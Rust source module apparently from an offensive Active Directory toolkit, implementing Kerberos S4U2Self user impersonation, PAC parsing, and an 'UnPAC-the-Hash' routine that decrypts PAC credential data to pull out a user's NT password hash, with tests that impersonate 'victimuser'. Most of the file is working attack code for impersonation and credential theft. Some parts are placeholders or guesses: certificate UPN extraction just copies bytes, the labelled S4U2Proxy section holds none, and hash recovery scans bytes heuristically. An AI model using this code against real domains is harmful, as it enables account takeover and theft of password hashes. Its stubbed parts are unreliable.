//! S4U - Services for User Extensions (MS-SFU)
//!
//! Implements S4U2Self and S4U2Proxy extensions for user impersonation:
//!
//! # S4U2Self (Protocol Transition)
//!
//! Allows a service to obtain a service ticket on behalf of a user,
//! without the user needing to authenticate. Used for:
//! - Protocol transition (Kerberos to non-Kerberos)
//! - User impersonation by trusted services
//!
//! # S4U2Proxy (Constrained Delegation)
//!
//! Allows a service to request tickets to other services on behalf
//! of a user. Requires specific delegation configuration.
//!
//! # UnPAC-the-Hash Attack
//!
//! When the service has `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag,
//! the resulting PAC contains the user's NT hash in PAC_CREDENTIAL_INFO.
//!
//! # References
//! - MS-SFU: Kerberos Protocol Extensions: S4U and PAC
//! - MS-PAC: Privilege Attribute Certificate Data Structure

use super::crypto::{Aes256CtsHmacSha1, KeyUsage, Rc4Hmac};
use super::types::{
  Checksum, EncryptedData, EncryptionKey, EncryptionType, KdcOptions, KdcReqBody, KerberosTime,
  PaData, PaDataType, PrincipalName, Realm, TgsReq, Ticket,
};
use crate::crypto::hmac;

// ═══════════════════════════════════════════════════════════════════════════
// PA-FOR-USER - The S4U2Self pre-authentication data
// ═══════════════════════════════════════════════════════════════════════════

/// PA-FOR-USER structure for S4U2Self
///
/// Identifies the user to impersonate when the service doesn't have
/// the user's credentials.
#[derive(Debug, Clone)]
pub struct PaForUser {
  /// Name of user to impersonate
  pub user_name: PrincipalName,
  /// User's realm
  pub user_realm: Realm,
  /// Checksum (KERB_CHECKSUM_HMAC_MD5 using service key)
  pub cksum: Checksum,
  /// Authentication package (usually "Kerberos")
  pub auth_package: String,
}

impl PaForUser {
  /// Create a new PA-FOR-USER for impersonating a user
  pub fn new(user_name: PrincipalName, user_realm: Realm, service_key: &EncryptionKey) -> Self {
    // Calculate checksum over: name-type || name-string || realm || auth-package
    let checksum_data = Self::build_checksum_data(&user_name, &user_realm, "Kerberos");
    let cksum = Self::calculate_checksum(service_key, &checksum_data);

    Self {
      user_name,
      user_realm,
      cksum,
      auth_package: "Kerberos".to_string(),
    }
  }

  /// Build the data to be checksummed
  fn build_checksum_data(
    user_name: &PrincipalName,
    user_realm: &Realm,
    auth_package: &str,
  ) -> Vec<u8> {
    let mut data = Vec::new();

    // name-type (4 bytes, little-endian)
    data.extend_from_slice(&(user_name.name_type as i32).to_le_bytes());

    // name-string components
    for component in &user_name.name_string {
      data.extend_from_slice(component.as_bytes());
    }

    // realm
    data.extend_from_slice(user_realm.0.as_bytes());

    // auth-package
    data.extend_from_slice(auth_package.as_bytes());

    data
  }

  /// Calculate KERB_CHECKSUM_HMAC_MD5 checksum
  fn calculate_checksum(key: &EncryptionKey, data: &[u8]) -> Checksum {
    // Per MS-SFU, use KERB_CHECKSUM_HMAC_MD5 with key usage 17
    let key_usage = 17u32; // KERB_KEY_USAGE_PA_S4U_X509_USER

    // Derive signature key: HMAC-MD5(key, "signaturekey\0")
    let ks = hmac::hmac_md5(&key.keyvalue, b"signaturekey\0");

    // Calculate HMAC
    let mut input = key_usage.to_le_bytes().to_vec();
    input.extend_from_slice(data);
    let checksum = hmac::hmac_md5(&ks, &input);

    Checksum::new(super::types::ChecksumType::HmacMd5, checksum.to_vec())
  }

  /// Encode as DER
  pub fn encode_der(&self) -> Vec<u8> {
    // PA-FOR-USER ::= SEQUENCE {
    //     userName     [0] PrincipalName,
    //     userRealm    [1] Realm,
    //     cksum        [2] Checksum,
    //     auth-package [3] KerberosString
    // }
    let mut body = Vec::new();

    // userName [0]
    body.extend_from_slice(&encode_tagged(0, &self.user_name.encode_der()));

    // userRealm [1]
    body.extend_from_slice(&encode_tagged(1, &self.user_realm.encode_der()));

    // cksum [2]
    body.extend_from_slice(&encode_tagged(2, &self.cksum.encode_der()));

    // auth-package [3]
    body.extend_from_slice(&encode_tagged(
      3,
      &encode_general_string(&self.auth_package),
    ));

    encode_sequence(&body)
  }

  /// Create PA-DATA from this PA-FOR-USER
  pub fn to_padata(&self) -> PaData {
    PaData::new(PaDataType::ForUser, self.encode_der())
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// S4U2Self Client
// ═══════════════════════════════════════════════════════════════════════════

/// S4U2Self client for user impersonation
pub struct S4U2SelfClient {
  /// Service's TGT
  pub service_tgt: Ticket,
  /// Service's session key (from TGT)
  pub session_key: EncryptionKey,
  /// Service principal name
  pub service_name: PrincipalName,
  /// Service realm
  pub service_realm: Realm,
}

impl S4U2SelfClient {
  /// Create a new S4U2Self client
  pub fn new(
    service_tgt: Ticket,
    session_key: EncryptionKey,
    service_name: PrincipalName,
    service_realm: Realm,
  ) -> Self {
    Self {
      service_tgt,
      session_key,
      service_name,
      service_realm,
    }
  }

  /// Build TGS-REQ for S4U2Self
  ///
  /// # Arguments
  /// * `target_user` - The user to impersonate
  /// * `target_realm` - The user's realm
  /// * `nonce` - Random nonce
  pub fn build_tgs_req(
    &self,
    target_user: &str,
    target_realm: &str,
    nonce: u32,
  ) -> Result<TgsReq, String> {
    let user_name = PrincipalName::user(target_user);
    let user_realm = Realm::new(target_realm);

    // Create PA-FOR-USER
    let pa_for_user = PaForUser::new(user_name, user_realm, &self.session_key);

    // Create authenticator
    let authenticator = self.build_authenticator(nonce)?;
    let enc_authenticator = self.encrypt_authenticator(&authenticator)?;

    // Create PA-TGS-REQ (contains AP-REQ with service TGT)
    let ap_req = self.build_ap_req(&enc_authenticator)?;
    let pa_tgs_req = PaData::new(PaDataType::TgsReq, ap_req);

    // Build KDC-REQ-BODY
    let req_body = KdcReqBody {
      kdc_options: KdcOptions::new()
        .with(KdcOptions::FORWARDABLE)
        .with(KdcOptions::RENEWABLE)
        .with(KdcOptions::CANONICALIZE),
      cname: Some(self.service_name.clone()), // S4U2Self: service is the client
      realm: self.service_realm.clone(),
      sname: Some(self.service_name.clone()), // Request ticket to ourselves
      from: None,
      till: KerberosTime::from_offset(8 * 60 * 60),
      rtime: None,
      nonce,
      etype: vec![EncryptionType::Aes256CtsHmacSha1, EncryptionType::Rc4Hmac],
      addresses: None,
      enc_authorization_data: None,
      additional_tickets: None,
    };

    // Build TGS-REQ with S4U PA-DATA
    let padata = vec![
      pa_tgs_req,
      pa_for_user.to_padata(),
      PaData::pac_request(true),
    ];

    Ok(TgsReq::new(req_body).with_padata(padata))
  }

  /// Build authenticator for TGS-REQ
  fn build_authenticator(&self, nonce: u32) -> Result<Vec<u8>, String> {
    // Authenticator ::= [APPLICATION 2] SEQUENCE {
    //     authenticator-vno [0] INTEGER,
    //     crealm            [1] Realm,
    //     cname             [2] PrincipalName,
    //     cksum             [3] Checksum OPTIONAL,
    //     cusec             [4] Microseconds,
    //     ctime             [5] KerberosTime,
    //     subkey            [6] EncryptionKey OPTIONAL,
    //     seq-number        [7] UInt32 OPTIONAL
    // }
    let mut body = Vec::new();

    // authenticator-vno [0] = 5
    body.extend_from_slice(&encode_tagged(0, &encode_integer(5)));

    // crealm [1]
    body.extend_from_slice(&encode_tagged(1, &self.service_realm.encode_der()));

    // cname [2]
    body.extend_from_slice(&encode_tagged(2, &self.service_name.encode_der()));

    // cusec [4] = 0
    body.extend_from_slice(&encode_tagged(4, &encode_integer(0)));

    // ctime [5]
    let ctime = KerberosTime::now();
    body.extend_from_slice(&encode_tagged(5, &ctime.encode_der()));

    let seq = encode_sequence(&body);
    Ok(encode_application(2, &seq))
  }

  /// Encrypt authenticator with session key
  fn encrypt_authenticator(&self, authenticator: &[u8]) -> Result<EncryptedData, String> {
    super::crypto::encrypt(
      &self.session_key,
      KeyUsage::TgsReqAuthenticator,
      authenticator,
    )
  }

  /// Build AP-REQ containing TGT and encrypted authenticator
  fn build_ap_req(&self, enc_authenticator: &EncryptedData) -> Result<Vec<u8>, String> {
    // AP-REQ ::= [APPLICATION 14] SEQUENCE {
    //     pvno         [0] INTEGER,
    //     msg-type     [1] INTEGER,
    //     ap-options   [2] APOptions,
    //     ticket       [3] Ticket,
    //     authenticator[4] EncryptedData
    // }
    let mut body = Vec::new();

    // pvno [0] = 5
    body.extend_from_slice(&encode_tagged(0, &encode_integer(5)));

    // msg-type [1] = 14 (AP-REQ)
    body.extend_from_slice(&encode_tagged(1, &encode_integer(14)));

    // ap-options [2] = empty (no flags)
    body.extend_from_slice(&encode_tagged(2, &encode_bit_string_32(0)));

    // ticket [3]
    body.extend_from_slice(&encode_tagged(3, &self.service_tgt.encode_der()));

    // authenticator [4]
    body.extend_from_slice(&encode_tagged(4, &enc_authenticator.encode_der()));

    let seq = encode_sequence(&body);
    Ok(encode_application(14, &seq))
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// S4U2Proxy (Constrained Delegation)
// ═══════════════════════════════════════════════════════════════════════════

/// PA-S4U-X509-USER for certificate-based S4U
#[derive(Debug, Clone)]
pub struct PaS4UX509User {
  /// User identifier (from certificate)
  pub user_id: Vec<u8>,
  /// User realm
  pub user_realm: Realm,
  /// Checksum
  pub cksum: Checksum,
  /// X.509 certificate
  pub user_cert: Vec<u8>,
}

impl PaS4UX509User {
  /// Create from certificate
  pub fn new(cert: &[u8], user_realm: Realm, service_key: &EncryptionKey) -> Result<Self, String> {
    // Extract UPN from certificate (simplified)
    let user_id = extract_upn_from_cert(cert)?;

    // Calculate checksum
    let mut data = Vec::new();
    data.extend_from_slice(&user_id);
    data.extend_from_slice(user_realm.0.as_bytes());

    let key_usage = 17u32;
    let ks = hmac::hmac_md5(&service_key.keyvalue, b"signaturekey\0");
    let mut input = key_usage.to_le_bytes().to_vec();
    input.extend_from_slice(&data);
    let checksum = hmac::hmac_md5(&ks, &input);

    Ok(Self {
      user_id,
      user_realm,
      cksum: Checksum::new(super::types::ChecksumType::HmacMd5, checksum.to_vec()),
      user_cert: cert.to_vec(),
    })
  }

  pub fn encode_der(&self) -> Vec<u8> {
    let mut body = Vec::new();

    // user-id [0]
    body.extend_from_slice(&encode_tagged(0, &encode_octet_string(&self.user_id)));

    // user-realm [1]
    body.extend_from_slice(&encode_tagged(1, &self.user_realm.encode_der()));

    // cksum [2]
    body.extend_from_slice(&encode_tagged(2, &self.cksum.encode_der()));

    // certificate [3]
    body.extend_from_slice(&encode_tagged(3, &self.user_cert));

    encode_sequence(&body)
  }

  pub fn to_padata(&self) -> PaData {
    PaData::new(PaDataType::S4uX509User, self.encode_der())
  }
}

/// Extract UPN from X.509 certificate (simplified)
fn extract_upn_from_cert(cert: &[u8]) -> Result<Vec<u8>, String> {
  // This is a placeholder. Real implementation would:
  // 1. Parse the X.509 certificate
  // 2. Find the Subject Alternative Name extension
  // 3. Extract the UPN (OID 1.3.6.1.4.1.311.20.2.3)

  // For now, return the first 32 bytes of the cert as an identifier
  Ok(cert.get(..32.min(cert.len())).unwrap_or(cert).to_vec())
}

// ═══════════════════════════════════════════════════════════════════════════
// PAC Parsing for UnPAC-the-Hash
// ═══════════════════════════════════════════════════════════════════════════

/// PAC structure for parsing
pub struct Pac {
  /// Raw PAC data
  pub data: Vec<u8>,
  /// Number of buffers
  pub buffer_count: u32,
  /// Individual buffers
  pub buffers: Vec<PacBuffer>,
}

/// PAC buffer types
#[repr(u32)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PacBufferType {
  LogonInfo = 1,
  CredentialsInfo = 2,
  ServerChecksum = 6,
  KdcChecksum = 7,
  ClientInfo = 10,
  S4U2ProxyDelegation = 11,
  UpnDnsInfo = 12,
  ClientClaimsInfo = 13,
  DeviceInfo = 14,
  DeviceClaims = 15,
  TicketChecksum = 16,
  Attributes = 17,
  Requestor = 18,
}

impl PacBufferType {
  pub fn from_u32(v: u32) -> Option<Self> {
    match v {
      1 => Some(Self::LogonInfo),
      2 => Some(Self::CredentialsInfo),
      6 => Some(Self::ServerChecksum),
      7 => Some(Self::KdcChecksum),
      10 => Some(Self::ClientInfo),
      11 => Some(Self::S4U2ProxyDelegation),
      12 => Some(Self::UpnDnsInfo),
      13 => Some(Self::ClientClaimsInfo),
      14 => Some(Self::DeviceInfo),
      15 => Some(Self::DeviceClaims),
      16 => Some(Self::TicketChecksum),
      17 => Some(Self::Attributes),
      18 => Some(Self::Requestor),
      _ => None,
    }
  }
}

/// Individual PAC buffer
#[derive(Debug, Clone)]
pub struct PacBuffer {
  pub buffer_type: PacBufferType,
  pub data: Vec<u8>,
}

impl Pac {
  /// Parse PAC from raw bytes
  pub fn parse(data: &[u8]) -> Result<Self, String> {
    if data.len() < 8 {
      return Err("PAC data too short".to_string());
    }

    let buffer_count = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
    let version = u32::from_le_bytes([data[4], data[5], data[6], data[7]]);

    if version != 0 {
      return Err(format!("Unexpected PAC version: {}", version));
    }

    let mut buffers = Vec::new();
    let mut offset = 8;

    for _ in 0..buffer_count {
      if offset + 16 > data.len() {
        break;
      }

      let buf_type = u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
      ]);
      let buf_size = u32::from_le_bytes([
        data[offset + 4],
        data[offset + 5],
        data[offset + 6],
        data[offset + 7],
      ]);
      let buf_offset = u64::from_le_bytes([
        data[offset + 8],
        data[offset + 9],
        data[offset + 10],
        data[offset + 11],
        data[offset + 12],
        data[offset + 13],
        data[offset + 14],
        data[offset + 15],
      ]);

      if let Some(buffer_type) = PacBufferType::from_u32(buf_type) {
        let start = buf_offset as usize;
        let end = start + buf_size as usize;

        if end <= data.len() {
          buffers.push(PacBuffer {
            buffer_type,
            data: data[start..end].to_vec(),
          });
        }
      }

      offset += 16;
    }

    Ok(Self {
      data: data.to_vec(),
      buffer_count,
      buffers,
    })
  }

  /// Get buffer by type
  pub fn get_buffer(&self, buffer_type: PacBufferType) -> Option<&PacBuffer> {
    self.buffers.iter().find(|b| b.buffer_type == buffer_type)
  }

  /// Extract NT hash from PAC_CREDENTIAL_INFO (UnPAC-the-hash)
  ///
  /// This only works when:
  /// 1. The service account has TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
  /// 2. The KDC includes PAC_CREDENTIAL_INFO in the ticket
  pub fn extract_nt_hash(&self, session_key: &EncryptionKey) -> Result<[u8; 16], String> {
    let cred_info = self
      .get_buffer(PacBufferType::CredentialsInfo)
      .ok_or("PAC_CREDENTIAL_INFO not present")?;

    // PAC_CREDENTIAL_INFO ::= {
    //     Version (ULONG),
    //     EncryptionType (ULONG),
    //     SerializedData (encrypted PAC_CREDENTIAL_DATA)
    // }

    if cred_info.data.len() < 8 {
      return Err("PAC_CREDENTIAL_INFO too short".to_string());
    }

    let _version = u32::from_le_bytes([
      cred_info.data[0],
      cred_info.data[1],
      cred_info.data[2],
      cred_info.data[3],
    ]);
    let etype = u32::from_le_bytes([
      cred_info.data[4],
      cred_info.data[5],
      cred_info.data[6],
      cred_info.data[7],
    ]);

    let encrypted_data = &cred_info.data[8..];

    // Decrypt based on encryption type
    let decrypted = match EncryptionType::from_i32(etype as i32) {
      Some(EncryptionType::Rc4Hmac) => {
        let key: [u8; 16] = session_key
          .keyvalue
          .clone()
          .try_into()
          .map_err(|_| "Invalid RC4 key length")?;
        Rc4Hmac::decrypt(&key, KeyUsage::AsRepEncPart, encrypted_data)?
      }
      Some(EncryptionType::Aes256CtsHmacSha1) => {
        let key: [u8; 32] = session_key
          .keyvalue
          .clone()
          .try_into()
          .map_err(|_| "Invalid AES key length")?;
        Aes256CtsHmacSha1::decrypt(&key, KeyUsage::AsRepEncPart, encrypted_data)?
      }
      _ => {
        return Err(format!(
          "Unsupported etype for PAC_CREDENTIAL_INFO: {}",
          etype
        ))
      }
    };

    // PAC_CREDENTIAL_DATA ::= {
    //     CredentialCount (ULONG),
    //     Credentials (SECPKG_SUPPLEMENTAL_CRED[])
    // }
    // Each credential contains:
    //     PackageName,
    //     CredentialSize,
    //     Credentials (for NTLM: NTLM_SUPPLEMENTAL_CREDENTIAL)

    // NTLM_SUPPLEMENTAL_CREDENTIAL ::= {
    //     Version (ULONG),
    //     Flags (ULONG),
    //     LmPassword (16 bytes),
    //     NtPassword (16 bytes)
    // }

    // Find NTLM credential in the data
    if decrypted.len() < 40 {
      return Err("Decrypted credential data too short".to_string());
    }

    // Parse credential count
    let cred_count = u32::from_le_bytes([decrypted[0], decrypted[1], decrypted[2], decrypted[3]]);

    if cred_count == 0 {
      return Err("No credentials in PAC_CREDENTIAL_DATA".to_string());
    }

    // Search for NTLM credential
    // This is simplified - real parsing would iterate through all credentials
    // and find the one with package name "NTLM"

    // Try to find 32 bytes that look like LM+NT hashes
    // NT hash is typically at offset 24 from the NTLM credential start
    for offset in 0..decrypted.len().saturating_sub(40) {
      // Check for NTLM credential marker
      let version = u32::from_le_bytes([
        decrypted[offset],
        decrypted[offset + 1],
        decrypted[offset + 2],
        decrypted[offset + 3],
      ]);

      if version == 0 || version == 1 {
        // Skip Version and Flags, then LmPassword
        let nt_offset = offset + 8 + 16; // 8 for header, 16 for LM

        if nt_offset + 16 <= decrypted.len() {
          let mut nt_hash = [0u8; 16];
          nt_hash.copy_from_slice(&decrypted[nt_offset..nt_offset + 16]);

          // Check if it looks like a valid hash (not all zeros)
          if nt_hash.iter().any(|&b| b != 0) {
            return Ok(nt_hash);
          }
        }
      }
    }

    Err("Could not find NT hash in PAC_CREDENTIAL_INFO".to_string())
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// ASN.1 Encoding Helpers
// ═══════════════════════════════════════════════════════════════════════════

fn encode_length(len: usize) -> Vec<u8> {
  if len < 128 {
    vec![len as u8]
  } else if len < 256 {
    vec![0x81, len as u8]
  } else if len < 65536 {
    vec![0x82, (len >> 8) as u8, len as u8]
  } else {
    vec![0x83, (len >> 16) as u8, (len >> 8) as u8, len as u8]
  }
}

fn encode_sequence(content: &[u8]) -> Vec<u8> {
  let mut result = vec![0x30];
  result.extend_from_slice(&encode_length(content.len()));
  result.extend_from_slice(content);
  result
}

fn encode_application(tag: u8, content: &[u8]) -> Vec<u8> {
  let mut result = vec![0x60 | tag];
  result.extend_from_slice(&encode_length(content.len()));
  result.extend_from_slice(content);
  result
}

fn encode_tagged(tag: u8, content: &[u8]) -> Vec<u8> {
  let mut result = vec![0xA0 | tag];
  result.extend_from_slice(&encode_length(content.len()));
  result.extend_from_slice(content);
  result
}

fn encode_integer(value: i32) -> Vec<u8> {
  let bytes = value.to_be_bytes();
  let mut start = 0;
  while start < 3 && bytes[start] == 0 && (bytes[start + 1] & 0x80) == 0 {
    start += 1;
  }

  if value >= 0 && (bytes[start] & 0x80) != 0 {
    let len = 4 - start + 1;
    let mut result = vec![0x02, len as u8, 0x00];
    result.extend_from_slice(&bytes[start..]);
    return result;
  }

  let len = 4 - start;
  let mut result = vec![0x02, len as u8];
  result.extend_from_slice(&bytes[start..]);
  result
}

fn encode_octet_string(data: &[u8]) -> Vec<u8> {
  let mut result = vec![0x04];
  result.extend_from_slice(&encode_length(data.len()));
  result.extend_from_slice(data);
  result
}

fn encode_bit_string_32(value: u32) -> Vec<u8> {
  let bytes = value.to_be_bytes();
  vec![0x03, 0x05, 0x00, bytes[0], bytes[1], bytes[2], bytes[3]]
}

fn encode_general_string(s: &str) -> Vec<u8> {
  let bytes = s.as_bytes();
  let mut result = vec![0x1B];
  result.extend_from_slice(&encode_length(bytes.len()));
  result.extend_from_slice(bytes);
  result
}

#[cfg(test)]
mod tests {
  use super::*;

  #[test]
  fn test_pa_for_user_encode() {
    let user_name = PrincipalName::user("victimuser");
    let user_realm = Realm::new("CORP.LOCAL");
    let service_key = EncryptionKey::new(EncryptionType::Rc4Hmac, vec![0u8; 16]);

    let pa_for_user = PaForUser::new(user_name, user_realm, &service_key);
    let der = pa_for_user.encode_der();

    // Should be a valid SEQUENCE
    assert_eq!(der[0], 0x30);
    assert!(der.len() > 20);
  }

  #[test]
  fn test_pac_parse() {
    // Minimal PAC structure
    let mut pac_data = Vec::new();

    // Buffer count = 1
    pac_data.extend_from_slice(&1u32.to_le_bytes());
    // Version = 0
    pac_data.extend_from_slice(&0u32.to_le_bytes());

    // PAC_INFO_BUFFER for LogonInfo
    pac_data.extend_from_slice(&1u32.to_le_bytes()); // Type = 1 (LogonInfo)
    pac_data.extend_from_slice(&4u32.to_le_bytes()); // Size = 4
    pac_data.extend_from_slice(&24u64.to_le_bytes()); // Offset = 24

    // Actual LogonInfo data (4 bytes)
    pac_data.extend_from_slice(&[0x01, 0x02, 0x03, 0x04]);

    let pac = Pac::parse(&pac_data).unwrap();

    assert_eq!(pac.buffer_count, 1);
    assert_eq!(pac.buffers.len(), 1);
    assert_eq!(pac.buffers[0].buffer_type, PacBufferType::LogonInfo);
  }

  #[test]
  fn test_s4u2self_client() {
    let ticket = Ticket {
      tkt_vno: 5,
      realm: Realm::new("CORP.LOCAL"),
      sname: PrincipalName::krbtgt("CORP.LOCAL"),
      enc_part: EncryptedData::new(EncryptionType::Aes256CtsHmacSha1, vec![0; 32]),
    };

    let session_key = EncryptionKey::new(EncryptionType::Aes256CtsHmacSha1, vec![0u8; 32]);

    let client = S4U2SelfClient::new(
      ticket,
      session_key,
      PrincipalName::service("HTTP", "webserver.corp.local"),
      Realm::new("CORP.LOCAL"),
    );

    let tgs_req = client
      .build_tgs_req("victimuser", "CORP.LOCAL", 12345)
      .unwrap();

    // Should have PA-FOR-USER in padata
    assert!(tgs_req
      .padata
      .iter()
      .any(|p| p.padata_type == PaDataType::ForUser));
  }
}
